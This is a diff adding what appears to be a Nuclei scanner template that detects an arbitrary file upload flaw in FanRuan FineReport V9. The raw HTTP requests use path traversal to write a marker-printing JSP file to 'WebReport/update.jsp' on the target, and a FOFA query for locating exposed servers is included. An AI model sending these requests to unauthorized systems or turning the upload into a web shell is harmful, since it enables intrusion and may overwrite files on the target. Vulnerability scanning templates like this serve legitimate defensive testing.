@@ -1,0 +1,36 @@
+id: fanruan-finereport-v9-design-save-svg-fileupload
+
+info:
+  name: 帆软报表 V9 design_save_svg - 任意文件文件上传
+  author: pphua
+  severity: critical
+  description: 帆软 V9 存在任意文件覆盖，导致攻击者可以任意文件上传
+  reference:
+    - todo
+  metadata: 
+    verified: true 
+    fofa-query: app="帆软-FineReport"
+  tags: fanruan,oa,fileupload,finereport
+
+http:
+  - raw:
+      - |
+        POST /ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp  HTTP/1.1
+        Host: {{Hostname}} 
+        Content-Type:text/xml;charset=UTF-8
+
+        {"__CONTENT__":"<%out.println(\"{{randstr}}\");%>","__CHARSET__":"UTF-8"}
+
+      - |
+        POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp  HTTP/1.1
+        Host: {{Hostname}} 
+        Content-Type:text/xml;charset=UTF-8
+
+        {"__CONTENT__":"<%out.println(\"{{randstr}}\");%>","__CHARSET__":"UTF-8"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'{{randstr}}')
+        condition: and
